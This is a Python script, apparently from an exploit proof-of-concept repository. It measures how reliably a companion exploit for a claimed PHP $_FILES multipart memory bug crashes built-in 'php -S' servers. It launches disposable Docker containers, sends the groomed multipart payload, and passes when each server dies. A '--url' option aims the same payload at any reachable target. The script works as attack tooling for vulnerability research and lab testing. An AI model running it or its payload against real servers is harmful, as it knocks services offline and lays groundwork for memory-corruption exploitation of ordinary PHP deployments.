#!/usr/bin/env python3
# INDEX: reliability check for the groomed $_files stale-bucket crash | cli | self-managed disposable php -S targets
"""verify_stale_bucket_groom_crash.py - black-box reliability check for
stale_bucket_groom_crash.py (CVE-2026-109618 groomed $_FILES stale-bucket
controlled-address shutdown crash).

Stock php -S has no pcntl in the docker php images, so a worker crash takes
down the whole process -- there is no long-lived target to restart between
trials. This verifier manages its own disposable container PER TRIAL
(`docker run --rm`, stock php:<image>-cli, docroot = lab/app/) and asserts
the arm kills every one of them: HTTP-reachable before the POST, unreachable
after. Black-box only (no gdb) -- gdb stays OBSERVE-only; see the primitive's
own docstring for the manual fault-address check.

Needs only a local `docker` with the php:8.4.26-cli image (pulled or
cached). No lab/compose profile required. SKIPs cleanly if docker is
unavailable or a trial's container never comes up.

Usage:
    python3 -I poc/bugs/verify_stale_bucket_groom_crash.py [--trials 5]
        [--fill C,a,Z,1,B] [--image php:8.4.26-cli] [--port-base 18980]

To check reliability against an already-running stock target instead (e.g.
a `php -S` you keep restarting by hand), pass --url and rerun once per
restart:

    docker run -d --rm --name p2s-sbg -p 18980:80 \\
        -v "$(pwd)/lab/app:/var/www/html:ro" php:8.4.26-cli php \\
        -d memory_limit=16M -d post_max_size=32M -d max_input_vars=1000000 \\
        -d max_file_uploads=1000000 -d max_multipart_body_parts=1000000 \\
        -S 0.0.0.0:80 -t /var/www/html
    python3 -I poc/bugs/verify_stale_bucket_groom_crash.py --url http://127.0.0.1:18980
"""
from __future__ import annotations

import argparse
import os
import subprocess
import sys
import time

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from bugs.stale_bucket_groom_crash import build_body, alive  # noqa: E402
from common.http_urllib import http  # noqa: E402
from common.multipart import PHP2SHELL_BOUNDARY_B as BND  # noqa: E402

LAB_APP = os.path.join(_POC_ROOT, "..", "lab", "app")
PHP_INI = ["-d", "memory_limit=16M", "-d", "post_max_size=32M",
           "-d", "max_input_vars=1000000", "-d", "max_file_uploads=1000000",
           "-d", "max_multipart_body_parts=1000000",
           "-d", "display_errors=0", "-d", "log_errors=1"]


def docker_ok():
    try:
        r = subprocess.run(["docker", "info"], capture_output=True, timeout=10)
        return r.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def spawn(name, port, image):
    """docker run -d --rm a fresh stock php -S container. True iff the
    `docker run` call itself succeeded (the server may still fail to bind)."""
    cmd = ["docker", "run", "-d", "--rm", "--name", name, "-p", f"{port}:80",
           "-v", f"{LAB_APP}:/var/www/html:ro", image, "php", *PHP_INI,
           "-S", "0.0.0.0:80", "-t", "/var/www/html"]
    r = subprocess.run(cmd, capture_output=True, timeout=60)
    return r.returncode == 0


def teardown(name):
    subprocess.run(["docker", "stop", "-t", "2", name], capture_output=True, timeout=15)


def wait_alive(base, path, timeout=10.0):
    t0 = time.time()
    while time.time() - t0 < timeout:
        if alive(base, path, timeout=2):
            return True
        time.sleep(0.3)
    return False


def fire(base, path, fill, pad, pairs, idx_len):
    body = build_body(fill, pad, pairs, idx_len)
    ct = "multipart/form-data; boundary=" + BND.decode()
    return http(base + path, data=body,
                headers={"Content-Type": ct, "Content-Length": str(len(body))},
                timeout=120)


def run_trial(i, name, port, image, fill, a):
    base = f"http://127.0.0.1:{port}"
    if not spawn(name, port, image):
        print(f"[trial {i}] docker run failed (image/port issue)")
        return None
    try:
        if not wait_alive(base, a.alive_path, timeout=10):
            print(f"[trial {i}] target never came up on {base}")
            return None
        t0 = time.time()
        s, _ = fire(base, a.path, fill, a.pad, a.pairs, a.idx_len)
        died = not alive(base, a.alive_path, timeout=5)
        print(f"[trial {i}] fill={fill!r}  HTTP={s}  worker {'DEAD' if died else 'alive'}  "
              f"{time.time() - t0:.1f}s")
        return died
    finally:
        teardown(name)


def run_self_managed(a):
    fills = a.fill.split(",")
    results = []
    for i in range(a.trials):
        fill = fills[i % len(fills)]
        name = f"p2s-sbg-verify-{os.getpid()}-{i}"
        results.append(run_trial(i, name, a.port_base + i, a.image, fill, a))
    return results


def run_against_url(a):
    base = a.url.rstrip("/")
    if not wait_alive(base, a.alive_path, timeout=5):
        return None
    fill = a.fill.split(",")[0]
    s, _ = fire(base, a.path, fill, a.pad, a.pairs, a.idx_len)
    died = not alive(base, a.alive_path, timeout=5)
    print(f"[trial 0] fill={fill!r}  HTTP={s}  worker {'DEAD' if died else 'alive'}")
    return [died]


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--url", default=None,
                    help="fire one trial against an already-running target "
                         "instead of self-managed containers")
    ap.add_argument("--trials", type=int, default=5)
    ap.add_argument("--fill", default="C,a,Z,1,B",
                     help="comma-separated fill bytes, cycled across trials")
    ap.add_argument("--pad", type=int, default=250)
    ap.add_argument("--pairs", type=int, default=60)
    ap.add_argument("--idx-len", type=int, default=262144)
    ap.add_argument("--path", default="/poc.php")
    ap.add_argument("--alive-path", default="/index.php")
    ap.add_argument("--image", default="php:8.4.26-cli")
    ap.add_argument("--port-base", type=int, default=18980)
    args = ap.parse_args()

    if args.url:
        results = run_against_url(args)
        if results is None:
            print(f"[SKIP] {args.url} not reachable")
            return 2
    else:
        if not docker_ok():
            print("[SKIP] docker not available. Bring up a target by hand and rerun "
                  "with --url, or fix docker for self-managed trials -- see this "
                  "script's module docstring for the docker run recipe.")
            return 2
        results = run_self_managed(args)
        if any(r is None for r in results):
            print("[SKIP] one or more trials could not reach a target "
                  "(docker/image/network issue, not an arm failure)")
            return 2

    ok = bool(results) and all(results)
    print(f"\n== VERDICT: {'PASS' if ok else 'FAIL'} "
          f"({sum(1 for r in results if r)}/{len(results)} trials killed the worker) ==")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
